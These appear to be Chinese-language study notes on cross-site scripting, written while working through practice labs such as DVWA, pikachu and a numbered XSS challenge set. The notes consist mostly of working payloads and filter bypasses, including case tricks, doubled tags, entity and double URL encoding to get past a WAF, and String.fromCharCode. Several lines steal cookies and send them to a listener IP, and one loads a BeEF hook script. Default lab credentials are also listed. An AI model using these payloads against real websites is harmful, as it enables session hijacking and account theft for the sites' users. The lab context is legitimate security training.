 xss ---url上的地址参数交互也是xss攻击的一种
查看源代码！=检查
跨站攻击
https://www.likecs.com/show-986504.html 部分xss实例
https://www.codenong.com/cs105989399/ dvwa-xss讲解

反射型（get post）这是诱导别人点击网址，有些搜索框，来获取别人的cookie
<a href=http://192.168.152.134/vulnerabilities/xss_r/?name=<script src=http...></script>抽奖>点我抽奖
DOM型 会有反馈(反射型xss的一种）点击url地址,类似反射型，但不限于搜索框、选项等
http://192.168.152.134/vulnerabilities/xss_d/?default=<script src=http...></script>English
存储型 <script src=http://192.168.158.130:3000/hook.js></script>123（模仿正常人）
能存储的地方不限于内容、名字、电话等

当内容不被过滤而是实体化编码时，标签无法闭合，所以无法注入，对一些特殊字符进行了处理，但是常规的specialchars函数不对单引号做出了编码
双引号无法对齐就用单引号

javascript
前端发生的攻击

前端代码执行
dom就是一个前端接口，不与后台交互

靶场  alert在线版  pikachu dvwa xssaq  平台

xss
跨站攻击

前端发生的攻击
javascript

安全人员测试xss
如果测试成功，就是让它弹窗
<script>alert(1)</script>



kali使用beef，beef=xss攻击平台
cd /usr/share/beef-xss
./beef
ui/panel操作窗口
hook.js是测试xss漏洞成功之后的攻击代码
<script src="http://192.168.152.130:3000/hook.js"></script>

用nc监听
nc.exe -lvp 4444

反弹
<script>document.write('<img src="http://192.168.2.129:9999/?'+document.cookie+' " />')</script>

xss靶场
xss1.njhack.xyz

dvwa靶场
admin
password

但凡出现互动的地方，都可能出现漏洞！！！！！

<input value="" onclick=alert('xss') type="text">
文本框点击执行
<pre>Hello <script>alert('1')</script></pre>
script标签是js语言执行用的，当js正确执行的时候，不会出现东西，js会被浏览器执行！！！！

<scr<script>ipt>alert('1')</script>

点住我！<img src="x" onmouseup=alert(1) />

<h1 onclick='alert(1)' > click me </h1>
burp抓包  name

onmouseover  鼠标拂过触发
跳过swtch防御并且获得cookie
English#<script>alert(document.cookie)</script>

html标签大小写不敏感
------------------

0x00
<script>alert(1)</script>

0x01
</textarea><script>alert(1)</script><textarea>

0x02
<input type="name" value="fdfdfdfd "><script>alert(1)</script><img      ">

0x03
function render ("haha") {
  const stripBracketsRe = /[()]/g
  input = "haha".replace(stripBracketsRe, '')
  return input
}

屏蔽括号，考虑使用`
<script>alert`1`</script>

0x04
屏蔽() `

实体编码字符<svg>
svg标签会翻译后面的html实体字符
<svg><script>alert&#40;1&#41;</script>


=====================

0x05
以下两个方法都可以当前端的注释符
<!-- --> 
<!-- --!>
--!><script>alert(1)</script>

0x06
（大胆换行）
正则表达式含义：
auto或者on开头，后面跟任意东西，直到出现=或者>都转换为_(无意义的下划线）
onmouseover
="alert(1)"
换行只不过是再人类的感官里，在机器眼里都是左右执行

0x07
正则表达式含义：
右边闭合自动转为空字符
<img src="x" onerror="alert(1)"
只要一错就会去执行js语句

文章图文并具，所以更容易出现xss漏洞

右边可以没有

0x08
(大胆换行也可以）
</style > 加一个空格来实现规避

0x09

正则表达式含义：
必须包含完整的HTTP网站

http://www.haha.com"></script><img src="x"  onerroe="alert(1)"

http://www.haha.com" onload="alert(1)"

0x0a    ？？？？？

@符号可以加载后方的js文件

0x0b

文件名大小写不敏感，js语法对于大小写敏感
js标签，src地址随便

<script>标签对大小写不敏感
域名加载无所谓大小写
xss平台也可用于搭载xss漏洞代码

0x0c
重复两次script
<scrscriptipt src=http://127.0.0.1/abc.js></scscriptript>
进行文件写入js命令

0x0d
换行
-->注释掉后面语句

0x0e
古英语替换

0x0f
闭合后换行1（Unicode编码在前端是摆设）

0x11
"）；alert(1);//

0x12
\");alert(1);//

xssaq  平台

先假装正常人
找到互动，根据你提交的信息会对页面显示造成影响，不管是静态还是动态


1
<script>alert(1)</script>

2
<input name=keyword  value="haha123   "><script>alert(1)</script>//   ">

3
<input name=keyword  value='haha123   ' onclick='alert(1)    '>

4
<input name=keyword  value="haha123   " onclick="alert(1)        ">

5
<a href="http://www.baidu.com">click me</a>
<input name=keyword  value="haha123  "><a href=javascript:alert(1)><"   ">

6
"><a hREf=javascript:alert(1)><"

7
<input name=keyword  value="haha123 "><scrscriptipt>alert(1)</scrscriptipt><"   ">
<scrscriptipt>alert(1)</scrscriptipt>

8
unicode编码在前端会进行解析为正常的字符串

href对Unicode编码免疫
javascript:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

href="这里面的任何字符串，都会被当作协议来执行"

9
一定要包含http://
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
javascript:alert(1)//http://

10
DOM型xss
<input name="t_sort"  value=" " type="text" onclick="alert(1)  " type="hidden">

haha123&t_sort=" type="text" onclick="alert(1)

11
Referer: 3&t_sort=" type="text" onclick="alert(1)

16
<svg%0aonload=alert(1)>

<input type='text' name='words' id='words' value='123 '/><img ' class='form-control' placeholder='' /> 


注入这个网站：
http://chanzhi7.njhack.xyz

首先判断后台会怎样防护xss注入
可不可以用加密来躲避防火墙
有几层防火墙

----
'/><img
被防火墙拦截
----

'/><img 一次编码
防火墙判断
交给一个程序判断 一次解码
search-index-123'/><img-1.html 当作一个文件来访问
访问不到，404

----

'/><img 二次编码
防火墙判断
交给一个程序判断 一次解码
search-index-[一次编码的内容]-1.html 进行搜索
防火墙进行解码，判断是否有img script ....，有就替换为空
搜索结果

----

<input type='text' name='words' id='words' value=' 123 ' onmouseover='alert(1) '/>

123' onmouseover='alert(1)
编码两次


T4 替换（
T6 替换 <>
T8 注释问题
0x0c  大写问题
0x0d  
0x11
0x0e
0x0f

T3
T5
T8

pikachu靶场
xss

1-3
<script>alert(1)</script>

4-5
注意看源代码中js刚开始就是'闭合
javascript:alert(1) 
#' onclick='alert(1)

6
nc -lvp 4444

<script>var img=document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>

7
<sCript>alert(1)</sCript>
<img src=x onerror=alert(1)>

8
htmlspecialchars
把字符转化为html实体（需要svg翻译的东西）
#' onclick='alert(1)

9
javascript:alert(1) 

10
';alert(1);//
';</script><script>alert(1)//


刁钻技法：（待测试）

1.<script>prompt('xss')</script>//////////
输出可输入的框，并弹出1（没啥用）


2.<iframe src="javascript:alert('xss')"><iframe>
   类似页面内开一个新页面

    <iframe                 src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    加密绕过
    <iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
    实体编码
   
3.     eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
适用于绕过黑名单alert 在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，
把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，因为大多数的过滤系统都不会把String.fromCharCode加以过滤
，例如关键字alert被过滤掉，那就可以这么利用alert(document.cookie)

<img src="1" onerror=alert&#40;1&#41;>（实体化()
<img src=1 onerror=alert&#40&#41>
4.
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
5.
<img src="1" onerror=location="javascript:alert(1)”>
<img src="1" onerror=location="javascript:alert%281%29”>



